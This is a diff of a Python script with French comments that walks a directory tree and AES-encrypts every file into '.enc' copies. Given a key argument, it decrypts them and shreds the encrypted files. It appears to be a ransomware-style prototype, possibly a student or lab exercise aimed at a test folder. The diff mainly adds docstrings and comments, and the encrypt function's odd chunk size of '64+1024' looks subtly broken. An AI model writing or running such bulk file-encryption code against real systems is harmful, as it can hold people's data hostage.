@@ -8,11 +8,17 @@ import sys
 import subprocess
 
 def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
+    '''
+    Chiffre un fichier en utilisant l'algorithme AES-256
+    key : clé utilisé pour le chiffrement
+    filename : le fichier qu'on souhaite chiffrer
+    out_filename : le fichier chiffré
+    chunksize : taille de bloc que la fonction va lire
+    '''
 
     if not out_filename:
         out_filename = filename + '.enc'
 
-    # iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
     iv = Random.new().read(AES.block_size)
 
     encryptor = AES.new(key, AES.MODE_CBC, iv)
@@ -34,8 +40,14 @@ def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
     
     
 
-
 def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
+    '''
+    Déchiffre un fichier
+    key : clé utilisé pour déchiffrer
+    filename : le fichier qu'on souhaite déchiffrer
+    out_filename : le fichier déchiffré
+    chunksize : taille de bloc que la fonction va lire
+    '''
 
     if not out_filename:
         out_filename = filename[:-4]
@@ -65,29 +77,30 @@ def main(argv):
     key= key.encode('utf-8')
 
     # a changer en /tmp
-    baseUrl = '../copie'
+    directory = './copie'
 
     is_decrypt = None
 
+    # récupère la clé en argument si il y en a un
     if len(argv) > 1:
         is_decrypt = True
         key = bytes(argv[1], 'utf-8')
 
-
-    for root, dirs, files in os.walk(baseUrl, topdown=False):
+    # récupère tous les fichiers présents dans directory
+    for root, dirs, files in os.walk(directory, topdown=False):
        for name in files:
             file = os.path.join(root, name)
             print(file)
 
-            # decrypt
+            # déchiffrement
             if is_decrypt:
                 if file[-4:] == ".enc":
                     print("[*] Decrypting... ")
                     decryptFile(key, file)
-	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
+	                #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
 
-            # encrypt
+            # chiffrement
             else:
                 if file[-4:] != ".enc":
                     print("[*] Encrypting... ")
